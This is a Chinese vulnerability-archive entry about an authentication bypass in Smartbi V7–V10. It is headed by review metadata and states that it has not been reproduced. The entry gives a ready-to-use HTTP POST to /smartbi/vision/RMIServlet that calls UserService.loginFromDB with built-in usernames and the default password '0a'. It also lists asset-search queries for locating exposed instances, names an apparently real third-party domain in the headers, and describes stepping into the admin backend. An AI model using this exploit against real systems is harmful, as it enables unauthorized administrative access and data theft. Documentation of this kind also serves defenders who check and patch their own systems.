---
source: "wy876 漏洞文库"
title: "Smartbi 内置用户loginFromDB认证绕过"
product: "Smartbi"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V7–V10，默认密文未改条件"
prerequisites: "初始会话与内置用户认证分开"
side_effects: "在线解密或外部服务可能收到凭据及敏感内容"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fkhbh9sf2269nv0m"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Smartbi/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name=="
hunter: "app.name==\"SMARTBI 思迈特\""
id: "vw-606caf4757194d72c55feffc"
entity_id: "ve-606caf4757194d72c55feffc"
schema_version: "1"
---

# Smartbi 内置用户loginFromDB认证绕过

## 条目说明

- 对象与具体问题：Smartbi；内置用户loginFromDB认证绕过
- 版本、配置及部署条件：V7–V10，默认密文未改条件
- 认证与权限前提：初始会话与内置用户认证分开
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 本篇result true加index.jsp会话访问比端点存在判定更完整，值得合并保留
- Origin/Referer含第三方实例域名和固定会话，需核对同一实验会话的字段一致性；Content-Length与正文长度需重算
- public/service/system只能从枚举中选择，随机构造用户名措辞不准
- Hunter app.name被错误抽进fofa残缺字段，补精确修复版本

## 操作风险

在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等Smartbi在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。

## 二、影响版本
+ V7 <= Smartbi <= V10

## 三、资产测绘
 

+ hunter：`app.name=="SMARTBI 思迈特"`


+ 登录页面


## 四、漏洞复现
1. 访问POC出现如下情况则可能存在漏洞

```plain
/smartbi/vision/RMIServlet
```

2. 使用POST请求如下params：其中的第一个参数是内置的三个用户名（public、service、system）可随机构造绕过登录,第二个参数是三个账号默认的密文密码(默认值为0a),当响应如下，且`result`参数为`true`时表示存在漏洞。

```http
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: xx.xx.xx.xx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=B08E6669BFA8E9D85FB6BD98411C
Origin: https://smartbi.cy-sys.cn
Referer: https://smartbi.cy-sys.cn/smartbi/vision/RMIServlet
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0

className=UserService&methodName=loginFromDB&params=["system","0a"]
```

> 请求长度说明：原资料 Content-Length 为 81；静态长度已移除，应由客户端根据最终请求体的字节数生成。


3. 访问`https://xx.xx.xx.xx/smartbi/vision/index.jsp`成功进入后台


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fkhbh9sf2269nv0m>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
